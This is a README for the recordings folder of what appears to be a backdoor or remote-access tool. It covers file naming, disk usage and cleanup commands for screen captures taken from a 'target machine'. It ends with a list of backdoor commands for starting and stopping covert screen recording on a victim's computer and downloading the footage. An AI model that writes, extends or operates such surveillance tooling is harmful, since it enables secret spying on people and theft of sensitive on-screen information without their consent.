# Screen Recordings Directory

This directory stores screen recordings captured from the target machine.

## File Naming Convention

- Format: `screen_recording_YYYYMMDD_HHMMSS.mp4`
- Example: `screen_recording_20231015_143022.mp4`

## File Types

- `.mp4` - Standard video format (most common)
- `.avi` - Alternative video format
- `.mkv` - Alternative video format

## Storage Considerations

Screen recordings can consume significant disk space:

- A 1-minute recording at 15 fps typically ranges from 30-60 MB (1080p)
- A 5-minute recording can be 150-300 MB
- Monitor available disk space regularly

## Cleanup

To remove old recordings:

```bash
# Remove all recordings
rm -rf logs/recordings/*

# Remove recordings older than 7 days (Linux/macOS)
find logs/recordings -name "*.mp4" -mtime +7 -delete

# Remove specific recording
rm logs/recordings/screen_recording_20231015_143022.mp4
```

## Security Note

⚠️ These recordings may contain sensitive information. Handle with care:

- Transfer securely
- Delete after analysis
- Do not store in public repositories
- Ensure proper encryption during transfer

## Commands

From the backdoor interface:

- `record_screen <duration> <fps>` - Record for specified duration
- `record_start` - Start background recording
- `record_stop` - Stop background recording
- `record_list` - List all recordings
- `record_status` - Check recording status
- `download logs/recordings/<filename>` - Download specific recording
